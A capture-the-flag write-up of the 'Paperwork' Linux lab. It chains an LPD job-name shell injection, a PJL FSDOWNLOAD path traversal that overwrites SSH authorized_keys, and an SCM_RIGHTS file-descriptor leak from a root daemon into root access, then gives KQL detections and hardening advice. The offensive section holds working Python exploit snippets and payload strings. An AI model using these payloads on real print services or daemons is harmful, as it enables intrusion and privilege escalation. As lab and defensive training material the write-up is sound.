# Paperwork

```
Difficulty: Easy
Operating System: Linux
Services: LPD (1515), internal PJL printer emulator (9100), local mgmt socket (paperwork-daemon)
```

## Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :----: | :------------------- | :--------------------------------- | :---------------------------------------------------------------- |
| 1 | Unauthenticated | **Network enumeration** | Identified an LPD service on `1515/tcp` and a loopback-only PJL printer emulator on `9100/tcp`. |
| 2 | Unauthenticated | **LPD job-name shell injection** | Crafted control-file job name (`Jx';<cmd>;#`) broke out of the daemon's shell invocation. |
| 3 | lp | **Command execution as lp** | Gained shell-level command execution running as the `lp` service account. |
| 4 | lp | **PJL `FSDOWNLOAD` path traversal** | Used the `lp` shell to send a crafted PJL job to `127.0.0.1:9100`, writing to `0:/../.ssh/authorized_keys`. |
| 5 | archivist | **SSH key overwrite** | Overwrote `archivist`'s `authorized_keys`, since the PJL emulator runs as `archivist`. |
| 6 | archivist | **SSH pivot** | Authenticated over SSH as `archivist` with the newly-planted key; retrieved `user.txt`. |
| 7 | archivist | **Log-triggered daemon abuse** | Wrote a trigger string into the watched command log to activate the root-owned `paperwork-daemon`. |
| 8 | archivist | **SCM_RIGHTS fd-passing leak** | Connected to `/run/paperwork/mgmt.sock` and received a root-opened file descriptor via `SCM_RIGHTS`. |
| 9 | Root | **Direct fd read + password reuse** | `os.pread()`'d the leaked fd to recover `ADMIN_PASSWORD`, reused it via `su root`; retrieved `root.txt`. |

# Offensive Operations

## Recon

Port scanning reveals:

```
1515/tcp  open  printer   (LPD - Line Printer Daemon)
9100/tcp  open  jetdirect (PJL printer emulator, bound to 127.0.0.1)
```

The LPD service accepts print jobs via the classic control-file protocol. The PJL emulator on `9100` is reachable only from localhost, and a further internal component - a Unix-socket management daemon at `/run/paperwork/mgmt.sock` - is discovered once shell access is obtained, watching a log file for specific command strings.

## Foothold: LPD Job-Name Shell Injection

The LPD daemon builds a shell command from the print job's name field (the `J` line in the control file) without sanitizing it. Sending:

```
\x02\n                          # open an empty print queue
H attacker
P user
Jx';<shell_cmd>;#               # breaks out of an `echo '...'`-style invocation
```

results in `<shell_cmd>` executing as the `lp` service account, since the daemon interpolates the job name directly into a shell string.

```python
def lpd_inject(shell_cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, 1515))
    s.send(b"\x02\n")
    job_line = f"Jx';{shell_cmd};#"
    control  = f"H attacker\nP user\n{job_line}\n".encode()
    header   = bytes([0x02]) + f"{len(control)} cfA001attacker\n".encode()
    s.send(header); s.send(control)
```

## Pivot: `lp` -> `archivist` via PJL `FSDOWNLOAD` Path Traversal

The PJL emulator's virtual filesystem, rooted at `0:/`, does not constrain the `FSDOWNLOAD NAME=` parameter. A traversal sequence escapes the virtual root:

```
0:/../.ssh/authorized_keys
```

Since the PJL emulator process itself runs as `archivist`, writing to that resolved path lands directly in `archivist`'s real home directory.

The injected shell command (delivered via the LPD foothold) generates an ephemeral keypair's public half, wraps it in PJL Universal Exit Language markers, and sends the `FSDOWNLOAD` request to `127.0.0.1:9100`:

```python
body = b'@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=%d\r\n' % len(pub) + pub
s.send(b'\x1b%-12345X' + body + b'\x1b%-12345X\r\n')
```

Polling SSH login as `archivist` with the new key succeeds shortly after; `user.txt` is retrieved.

## Enumeration as archivist

`archivist` cannot directly read `/etc/paperwork/admin_pins.conf` (root-owned), but a privileged daemon - `paperwork-daemon` - listens on `/run/paperwork/mgmt.sock`. It watches `/home/archivist/printer/logs/commands.log` for trigger substrings (`FSUPLOAD`, `FSDOWNLOAD`, `FSQUERY`) and, upon seeing one, accepts a connection on the socket and passes an already-open root file descriptor via `SCM_RIGHTS` ancillary data - with no peer authentication.

## Privesc: SCM_RIGHTS fd-Passing Leak -> Root Password

```python
with open(LOG, "a") as f:
    f.write("FSUPLOAD trigger-lockdown\n")

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
for level, ctype, cdata in anc:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        fds.frombytes(cdata)
for fd in fds:
    data = os.pread(fd, 4096, 0).decode(errors="ignore")
    # ADMIN_PASSWORD=... extracted here
```

Because the fd is already open by the root-privileged daemon, standard file-permission checks never apply - reading it is simply `pread()` on an inherited descriptor.

## Root

The recovered `ADMIN_PASSWORD` is reused directly as the `root` account password:

```bash
echo <admin_pw> | su -c 'id; cat /root/root.txt' root
```

Full root access obtained.

# Defensive Operations

## Strategic Overview

* **1.1 Definition:** Exploitation of unauthenticated shell injection in a legacy printing protocol (LPD), pivoted through a printer-firmware-style path traversal (PJL `FSDOWNLOAD`) to steal SSH credentials, followed by abuse of an unauthenticated Unix-socket file-descriptor-passing mechanism in a root-privileged management daemon.
* **1.2 Impact:** Complete System Compromise / Root Access.
* **1.3 The Scenario:** An external actor reaches a legacy LPD print service and injects shell commands as the `lp` account. From there, the actor pivots through an internal-only PJL printer emulator, exploiting its virtual filesystem's lack of path constraints to overwrite another user's SSH authorized_keys. Once logged in as that user, the actor abuses a log-file-triggered condition to coax a root daemon into leaking a privileged file descriptor over a local socket, disclosing a password that is reused for the `root` account itself.

## System Architecture & Theory

* **2.1 Environment:** Linux, legacy LPD daemon, custom PJL printer emulator, Unix-socket management daemon with `SCM_RIGHTS` fd-passing, log-file-driven trigger logic.
* **2.2 Attack Logic Flow:**

> [LPD Port 1515] -> [Job-Name Shell Injection] -> [lp Shell] -> [PJL FSDOWNLOAD Traversal to 9100] -> [archivist authorized_keys Overwritten] -> [SSH as archivist] -> [Log Trigger Written] -> [mgmt.sock SCM_RIGHTS fd Leak] -> [ADMIN_PASSWORD Disclosed] -> [su root]

* **2.3 Theoretical Analogy:** Tricking an old fax machine's job-name field into running an unintended command, then using that machine's own maintenance port to overwrite a colleague's office key, and finally shouting a specific magic phrase down the hallway that causes a supervisor's assistant to slide a master key under the door without ever checking who asked.

## Attack Vector

| Attribute | Technical Details |
| :----------------------------- | :-------------------------------------------------------------------------- |
| **Primary Identifiers** | LPD control-file `J` (job name) field, port `1515`<br>PJL `FSDOWNLOAD NAME=` parameter, port `9100` (loopback)<br>`/run/paperwork/mgmt.sock`<br>`/home/archivist/printer/logs/commands.log` |
| **Critical Vulnerability** | **OS command injection** via unsanitized LPD job name.<br>**Path traversal** in the PJL virtual filesystem's `FSDOWNLOAD` handling.<br>**Unauthenticated privileged file-descriptor passing** (`SCM_RIGHTS`) gated only by a client-writable log condition. |
| **Offensive Action** | LPD shell injection -> PJL traversal SSH-key overwrite -> SSH pivot -> log-triggered fd leak -> password reuse -> root |

### Prerequisites

* **Access Level:** Unauthenticated network access to LPD (initial foothold); local shell access as a user who can write to the watched log and connect to the mgmt socket (privesc).
* **Connectivity:** Ingress TCP `1515`; loopback access to `9100` and the Unix socket from the local host context.
* **Target State:** LPD interpolates job names into a shell command; PJL emulator's virtual filesystem paths are not canonicalized; `paperwork-daemon` passes fds without verifying the connecting peer's identity.

## Threat Hunting & Anomaly Analysis

* **Hunt Hypothesis:** Adversaries exploiting this chain will cause the LPD process to spawn shell children with unusual job-name-derived arguments, will generate PJL traffic containing `FSDOWNLOAD` with traversal sequences, and will produce a connection to the management socket immediately following a log write containing `FS*` keywords from a non-privileged account.
* **Behavioral Outliers:** LPD (`lpd`/print spooler process) spawning `bash`/`sh` children. PJL payloads referencing `0:/../` or other traversal sequences. A user process appending a `FSUPLOAD`/`FSDOWNLOAD`/`FSQUERY` string to the command log immediately before opening `/run/paperwork/mgmt.sock`.
* **Toxic Combinations:** A print-job field trusted enough to reach a shell; a loopback service whose "sandboxed" virtual filesystem is not actually enforced; a root daemon whose privileged action is gated by content of a file writable by unprivileged local users.

## Detection Engineering

* **Telemetry Gap Analysis:** Linux Auditd (`execve` for the LPD/print spooler process tree), file-integrity/write monitoring on the printer command log, Unix-socket connection auditing for `/run/paperwork/mgmt.sock`, Sysmon-for-Linux process creation and file events.
* **Detection-as-Code (KQL):**

```kql
// Detect LPD/print spooler spawning a shell - should never happen in normal operation
DeviceProcessEvents
| where InitiatingProcessFileName has_any ("lpd", "in.lpd", "cupsd")
| where FileName in ("bash", "sh")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

```kql
// Detect a write to the watched command log immediately followed by a connection
// to the management socket from the same non-daemon process
DeviceFileEvents
| where FolderPath has "printer/logs/commands.log"
| where ActionType == "FileModified"
| join kind=inner (
    DeviceEvents
    | where AdditionalFields has "mgmt.sock"
) on DeviceName
| where abs(datetime_diff('second', Timestamp, Timestamp1)) < 10
```

* **Resilience Test:** An adversary aware of the log-based trigger could delay the socket connection or interleave benign log entries to blend with legitimate printer traffic, evading a tight time-window correlation rule.
* **Sub-Rule:** Alert on any `SCM_RIGHTS` fd-passing event on `mgmt.sock` where the receiving process's UID differs from the expected `archivist`/daemon service pairing, if `SO_PEERCRED` telemetry is available.

## Toolkit & Implementation

* **Automation:** Custom Python exploit script - raw-socket LPD control-file injector, PJL `FSDOWNLOAD` payload builder, SSH automation via `subprocess`, embedded Python payload for the `SCM_RIGHTS` leak (`socket`, `array`, `os.pread`), password-reuse `su` trigger.
* **OPSEC Analysis:** Using the LPD shell only to relay a single PJL write (rather than establishing a persistent shell there) minimizes dwell time on the noisier `lp` foothold. Leaking the admin password via an already-open fd (rather than attempting to read the config file path directly) sidesteps any file-permission-based detection entirely, since no permission-denied event is ever generated.
* **Post-Exploitation:** Both flags retrieved via direct `cat` over SSH/`su`, with no interactive shell required until final verification.

## Defensive Mitigation

* **Technical Hardening:**
  1. Never interpolate user-controlled LPD fields into a shell string; pass job metadata as data only, using argument arrays with no shell interpretation.
  2. Canonicalize and jail all PJL virtual-filesystem paths (`FSDOWNLOAD`/`FSUPLOAD`/`FSQUERY`) to a real chroot, rejecting any traversal outside the intended root.
  3. Require `SO_PEERCRED` verification (or equivalent) before any Unix-socket daemon passes a privileged file descriptor to a connecting client.
  4. Do not gate privileged daemon behavior on the contents of a log file writable by unprivileged users; use an authenticated IPC request instead.
  5. Eliminate password reuse between application/config secrets and OS account passwords; rotate immediately upon any suspected disclosure.
* **Personnel Focus:** Educate developers that "internal-only" or "loopback-only" services are not a substitute for authentication - any locally-reachable service that can act on behalf of another user or process needs its own access control.

## Quick Action Playbook

| Step | Objective | Technical Command / Logic |
| :-----: | :--------------------------- | :----------------------------------------------------------------------------------------------- |
| **01** | **Inject via LPD** | Send control file with `Jx';<cmd>;#` to port `1515` |
| **02** | **Pivot via PJL traversal** | `@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=<n>` to `127.0.0.1:9100` |
| **03** | **Leak & escalate** | Write `FSUPLOAD` trigger to log -> connect to `mgmt.sock` -> `recvmsg()`/`SCM_RIGHTS` -> `os.pread(fd,...)` -> `su root` |
